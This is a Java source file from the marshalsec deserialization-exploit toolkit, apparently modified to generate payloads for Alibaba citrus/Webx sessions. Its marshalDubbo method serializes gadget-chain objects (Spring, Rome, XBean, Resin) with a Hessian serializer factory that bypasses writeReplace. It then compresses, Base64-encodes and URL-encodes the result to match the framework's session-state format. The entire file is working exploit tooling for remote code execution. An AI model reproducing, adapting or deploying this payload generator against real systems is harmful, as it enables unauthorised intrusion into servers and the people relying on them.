/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec;


import com.alibaba.citrus.hessian.io.AbstractHessianOutput;
import com.alibaba.citrus.hessian.io.Hessian2Input;
import com.alibaba.citrus.hessian.io.WriteReplaceSerializer;
import com.alibaba.citrus.service.requestcontext.session.encoder.SessionEncoderException;
import marshalsec.gadgets.*;
import org.apache.commons.codec.binary.Base64;

import java.io.IOException;
import java.net.URLEncoder;
import java.util.zip.Deflater;
import java.util.zip.DeflaterOutputStream;


/**
 * Not applicable:
 * - BindingEnumeration/LazySearchEnumeration/ServiceLoader/ImageIO: custom conversion of Iterator
 *
 * @author mbechler
 */
public abstract class HessianBase extends MarshallerBase<byte[]>
        implements SpringPartiallyComparableAdvisorHolder, SpringAbstractBeanFactoryPointcutAdvisor,SpringAbstractBeanFactoryPointcutAdvisor2, Rome, XBean, Resin {

    /**
     * {@inheritDoc}
     *
     * @see marshalsec.MarshallerBase#marshal(java.lang.Object)
     */
    @Override
    public byte[] marshal(Object o) throws Exception {
//        ByteArrayOutputStream bos = new ByteArrayOutputStream();
//        AbstractHessianOutput out = createOutput(bos);
//        NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
//        sf.setAllowNonSerializable(true);
//        out.setSerializerFactory(sf);
//        out.writeObject(o);
//        out.close();
//        return bos.toByteArray();

        return marshalDubbo(o);
    }

    public byte[] marshalDubbo(Object o) throws Exception {

        com.alibaba.citrus.util.io.ByteArrayOutputStream bos = new com.alibaba.citrus.util.io.ByteArrayOutputStream();
        AbstractHessianOutput out = createOutput(bos);
        NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
        sf.setAllowNonSerializable(true);
        out.setSerializerFactory(sf);
        out.writeObject(o);
        out.close();
        com.alibaba.citrus.util.io.ByteArrayOutputStream baos = new com.alibaba.citrus.util.io.ByteArrayOutputStream();
        // 1. 序列化
        // 2. 压缩
        Deflater def = new Deflater(Deflater.BEST_COMPRESSION, false);
        DeflaterOutputStream dos = new DeflaterOutputStream(baos, def);
        try {
            //替换为将bos写入dos
            dos.write(bos.toByteArray().toByteArray());
            dos.finish();
            dos.flush();
        } catch (Exception e) {
            throw new SessionEncoderException("Failed to encode session state", e);
        } finally {
            try {
                dos.close();
            } catch (IOException e) {
            }

            def.end();
        }
        byte[] plaintext = baos.toByteArray().toByteArray();

        // 3. 加密
        String encodedValue = new String(Base64.encodeBase64(plaintext, false), "ISO-8859-1");
        String url = URLEncoder.encode(encodedValue, "ISO-8859-1");
        //System.out.println(url);
        return url.getBytes();

    }


    /**
     * {@inheritDoc}
     *
     * @see marshalsec.MarshallerBase#unmarshal(java.lang.Object)
     */
    @Override
    public Object unmarshal(byte[] data) throws Exception {

        com.alibaba.citrus.util.io.ByteArrayInputStream bis = new com.alibaba.citrus.util.io.ByteArrayInputStream(data);
        Hessian2Input in = createInput(bis);
        return in.readObject();
    }


    protected abstract com.alibaba.citrus.hessian.io.Hessian2Output createOutput(com.alibaba.citrus.util.io.ByteArrayOutputStream bos);

    protected abstract com.alibaba.citrus.hessian.io.Hessian2Input createInput(com.alibaba.citrus.util.io.ByteArrayInputStream bos);


    public static class NoWriteReplaceSerializerFactory extends com.alibaba.citrus.hessian.io.SerializerFactory {

        /**
         * {@inheritDoc}
         */
        public com.alibaba.citrus.hessian.io.Serializer getObjectSerializer(Class<?> cl) throws com.alibaba.citrus.hessian.io.HessianProtocolException {
            return super.getObjectSerializer(cl);
        }


        /**
         * {@inheritDoc}
         */
        public com.alibaba.citrus.hessian.io.Serializer getSerializer(Class cl) throws com.alibaba.citrus.hessian.io.HessianProtocolException {
            com.alibaba.citrus.hessian.io.Serializer serializer = super.getSerializer(cl);

            if (serializer instanceof WriteReplaceSerializer) {
                return com.alibaba.citrus.hessian.io.UnsafeSerializer.create(cl);
            }
            return serializer;
        }

    }

}
